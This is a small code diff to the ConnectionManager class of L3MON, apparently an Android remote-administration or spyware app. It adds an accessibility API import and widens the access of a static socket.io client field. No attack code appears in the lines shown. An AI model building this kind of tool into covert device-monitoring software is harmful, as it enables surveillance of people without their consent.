@@ -3,6 +3,7 @@ package com.etechd.l3mon;
 import android.content.Context;
 import android.os.Looper;
 import android.util.Log;
+import android.view.accessibility.AccessibilityNodeInfo;
 
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -13,7 +14,7 @@ public class ConnectionManager {
 
 
     public static Context context;
-    private static io.socket.client.Socket ioSocket;
+    static io.socket.client.Socket ioSocket;
     private static FileManager fm = new FileManager();
 
     public static void startAsync(Context con)
